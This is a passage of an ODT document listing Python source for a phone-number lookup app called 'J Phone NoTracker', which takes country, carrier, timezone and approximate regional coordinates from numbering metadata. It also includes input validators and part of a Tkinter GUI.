      <text:p text:style-name="P27"><text:s text:c="12"/>result.country_name = geocoder.country_name_for_number(parsed, "en")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.location = geocoder.description_for_number(parsed, "en")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Step 3: Get carrier information</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.carrier_name = carrier.name_for_number(parsed, "en")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Step 4: Get timezone(s)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>tz_names = timezone.time_zones_for_number(parsed)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.timezones = list(tz_names) if tz_names else None</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Step 5: Determine number type</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>num_type = phonenumbers.number_type(parsed)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.number_type = self.NUMBER_TYPES.get(num_type, "Unknown")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Step 6: Get coordinates</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>coords = self._get_coordinates(result.location or result.country_name)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if coords:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>result.latitude, result.longitude = coords</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/># Step 7: Get local time if coordinates available</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>if result.timezones:</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="24"/>tz = pytz.timezone(result.timezones[0])</text:p>
      <text:p text:style-name="P27"><text:s text:c="24"/>result.local_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="24"/>logger.error(f"Error getting local time: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.info(f"Successfully tracked number: {result}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except phonenumbers.NumberParseException as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.error(f"Number parse error: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.error(f"Unexpected error tracking number: {e}", exc_info=True)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return result</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def _get_coordinates(self, location_name: str) -&gt; Optional[Tuple[float, float]]:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Get coordinates for a location name.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Uses cached results first, then fallback database, then online lookup.</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>location_name: Name of location (city/country)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>Tuple of (latitude, longitude) or None</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not location_name:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return None</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Check cache first</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if self.cache_results and location_name in self.geocode_cache:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.debug(f"Cache hit for {location_name}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return self.geocode_cache[location_name]</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Check fallback database</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if location_name in CITY_CENTERS:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>coords = CITY_CENTERS[location_name]</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.debug(f"Found in fallback database: {location_name} -&gt; {coords}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if self.cache_results:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.geocode_cache[location_name] = coords</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return coords</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Try online geocoding if enabled</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if self.use_online_geocoding:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>coords = get_coordinates_from_location(location_name)</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>if coords:</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>logger.debug(f"Online geocoding successful: {location_name} -&gt; {coords}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>if self.cache_results:</text:p>
      <text:p text:style-name="P27"><text:s text:c="24"/>self.geocode_cache[location_name] = coords</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>return coords</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>logger.error(f"Online geocoding failed for {location_name}: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def get_lookup_history(self, limit: int = 10) -&gt; List[Dict]:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Retrieve recent lookup history from log file.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>limit: Maximum number of history entries</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>List of lookup records</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Implementation would parse logs or database</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># For brevity, returns empty list</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return []</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Singleton instance for application-wide use</text:p>
      <text:p text:style-name="P27">_tracker_instance = None</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def get_tracker() -&gt; PhoneNumberTracker:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Get or create the global tracker instance."""</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="4"/>global _tracker_instance</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if _tracker_instance is None:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>_tracker_instance = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return _tracker_instance</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">File: src/data/city_centers.py</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">Fallback database of city coordinates.</text:p>
      <text:p text:style-name="P27">Used when online geocoding fails or is disabled.</text:p>
      <text:p text:style-name="P27">Sources: GeoNames, OpenStreetMap, Wikipedia</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">CITY_CENTERS = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Tanzania - Major cities</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Dar es Salaam": (-6.7924, 39.2083),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Dodoma": (-6.1731, 35.7419), <text:s/># Capital</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Mwanza": (-2.5164, 32.9175),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Arusha": (-3.3869, 36.6830),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Mbeya": (-8.8900, 33.4300),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Morogoro": (-6.8247, 37.6630),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Tanga": (-5.0725, 39.0992),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Zanzibar City": (-6.1659, 39.2026),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Kigoma": (-4.8769, 29.6267),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Moshi": (-3.3349, 37.3404),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Tabora": (-5.0425, 32.8197),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Iringa": (-7.7680, 35.6956),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Bukoba": (-1.3322, 31.8122),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Songea": (-10.6833, 35.6500),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Lindi": (-10.0000, 39.7167),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Mtwara": (-10.2667, 40.1833),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Rukwa": (-8.0000, 31.3333),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Katavi": (-6.5000, 31.5000),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Njombe": (-9.3333, 34.7667),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Geita": (-2.8667, 32.1667),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Simiyu": (-2.9833, 33.7833),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Kagera": (-2.0000, 31.5000),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Shinyanga": (-3.6636, 33.4211),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Pwani": (-7.0000, 39.0000),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Manyara": (-4.7500, 36.6667),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Kilimanjaro": (-3.0000, 37.3333),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Pemba North": (-5.0000, 39.7500),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Pemba South": (-5.3333, 39.7500),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Unguja North": (-6.0000, 39.3333),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Unguja South": (-6.3333, 39.5000),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Mjini Magharibi": (-6.1667, 39.2000),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Other countries (partial)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"United States": (39.8283, -98.5795), <text:s/># Geographic center</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"United Kingdom": (54.7024, -3.2766),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Germany": (51.1657, 10.4515),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"France": (46.6034, 1.8883),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Kenya": (-1.2864, 36.8172),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Uganda": (1.3733, 32.2903),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Rwanda": (-1.9403, 29.8739),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Burundi": (-3.3731, 29.9189),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"South Africa": (-30.5595, 22.9375),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Nigeria": (9.0820, 8.6753),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"Ghana": (7.9465, -1.0232),</text:p>
      <text:p text:style-name="P27">}</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/>File: src/utils/validators.py</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">Input validation utilities.</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">import re</text:p>
      <text:p text:style-name="P27">import logging</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">logger = logging.getLogger(__name__)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def validate_phone_number(phone_number: str) -&gt; bool:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Basic validation of phone number format.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>phone_number: Phone number string</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>True if format appears valid</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not phone_number:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return False</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Remove common separators</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>cleaned = re.sub(r'[\s\-\(\)]', '', phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Basic pattern: starts with + followed by 7-15 digits</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>pattern = r'^\+\d{7,15}$'</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not re.match(pattern, cleaned):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>logger.debug(f"Phone number failed basic validation: {phone_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return False</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return True</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def sanitize_phone_number(phone_number: str) -&gt; str:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Clean up phone number input.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>phone_number: Raw input</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Cleaned number with only + and digits</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Remove all non-digit characters except leading +</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>cleaned = re.sub(r'[^\d+]', '', phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Ensure exactly one + at the beginning</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if cleaned.startswith('+'):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>cleaned = '+' + re.sub(r'\+', '', cleaned[1:])</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>cleaned = '+' + re.sub(r'\+', '', cleaned)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return cleaned</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:span text:style-name="T2">Step 5:</text:span> GUI Implementation</text:p>
      <text:p text:style-name="P27">File: src/gui/window.py</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">Main GUI window implementation using Tkinter.</text:p>
      <text:p text:style-name="P27">Provides a professional dark-themed interface.</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">import tkinter as tk</text:p>
      <text:p text:style-name="P27">from tkinter import ttk, messagebox</text:p>
      <text:p text:style-name="P27">from datetime import datetime</text:p>
      <text:p text:style-name="P27">import webbrowser</text:p>
      <text:p text:style-name="P27">from typing import Optional</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">from src.core.tracker import get_tracker, PhoneNumberInfo</text:p>
      <text:p text:style-name="P27">from src.utils.validators import sanitize_phone_number</text:p>
      <text:p text:style-name="P27">from src.utils.logger import get_logger</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">logger = get_logger(__name__)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class PhoneTrackerGUI:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Main application window."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self, root):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root = root</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.title("J Phone NoTracker - Phone Number Intelligence")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.geometry("700x600")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.minsize(600, 500)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Set dark theme</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.setup_theme()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Initialize tracker</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.tracker = get_tracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.current_result: Optional[PhoneNumberInfo] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Build UI</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.setup_ui()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>logger.info("GUI initialized")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def setup_theme(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Configure dark theme colors."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.bg_color = "#1e1e1e"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.fg_color = "#ffffff"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.accent_color = "#007acc"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.success_color = "#4caf50"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.error_color = "#f44336"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.configure(bg=self.bg_color)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Style configuration</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>style = ttk.Style()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>style.theme_use('clam')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>style.configure('TLabel', </text:p>
      <text:p text:style-name="P27"><text:s text:c="23"/>background=self.bg_color, </text:p>
      <text:p text:style-name="P27"><text:s text:c="23"/>foreground=self.fg_color)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>style.configure('TFrame', background=self.bg_color)</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>style.configure('TButton', </text:p>
      <text:p text:style-name="P27"><text:s text:c="23"/>background=self.accent_color,</text:p>
      <text:p text:style-name="P27"><text:s text:c="23"/>foreground=self.fg_color,</text:p>
      <text:p text:style-name="P27"><text:s text:c="23"/>borderwidth=0,</text:p>
      <text:p text:style-name="P27"><text:s text:c="23"/>focuscolor='none')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>style.map('TButton',</text:p>
      <text:p text:style-name="P27"><text:s text:c="17"/>background=[('active', '#005a9e')])</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def setup_ui(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Create all UI components."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Main container with padding</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>main_frame = ttk.Frame(self.root, padding="20")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>main_frame.pack(fill=tk.BOTH, expand=True)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Title</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>title_label = ttk.Label(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>main_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="🔍 J Phone NoTracker",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>font=('Segoe UI', 24, 'bold'),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>foreground=self.accent_color</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>title_label.pack(pady=(0, 20))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>subtitle_label = ttk.Label(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>main_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="Phone Number Intelligence &amp; Geolocation",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>font=('Segoe UI', 10),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>foreground='#888888'</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>subtitle_label.pack(pady=(0, 30))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Input section</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>input_frame = ttk.Frame(main_frame)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>input_frame.pack(fill=tk.X, pady=(0, 20))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>input_label = ttk.Label(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>input_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="Enter Phone Number (International format):",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>font=('Segoe UI', 10)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>input_label.pack(anchor=tk.W, pady=(0, 5))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Input row with button</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>input_row = ttk.Frame(input_frame)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>input_row.pack(fill=tk.X)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.phone_var = tk.StringVar()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.phone_var.set("+255") <text:s/># Default to Tanzania</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.phone_entry = ttk.Entry(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>input_row,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>textvariable=self.phone_var,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>font=('Segoe UI', 12),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>width=30</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.phone_entry.pack(side=tk.LEFT, padx=(0, 10))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.phone_entry.bind('&lt;Return&gt;', lambda e: self.track_number())</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>self.track_button = ttk.Button(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>input_row,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="🔍 TRACK",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>command=self.track_number,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>style='Accent.TButton'</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.track_button.pack(side=tk.LEFT)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.clear_button = ttk.Button(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>input_row,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="🗑️ CLEAR",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>command=self.clear_input</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.clear_button.pack(side=tk.LEFT, padx=(10, 0))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Results section</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>results_frame = ttk.LabelFrame(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>main_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="Tracking Results",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>padding="15"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>results_frame.pack(fill=tk.BOTH, expand=True)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Create results display with grid layout</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text = tk.Text(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>results_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>height=15,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>wrap=tk.WORD,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>font=('Consolas', 10),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>bg='#2d2d2d',</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>fg='#d4d4d4',</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>relief=tk.FLAT,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>borderwidth=0</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.pack(fill=tk.BOTH, expand=True)</text:p>
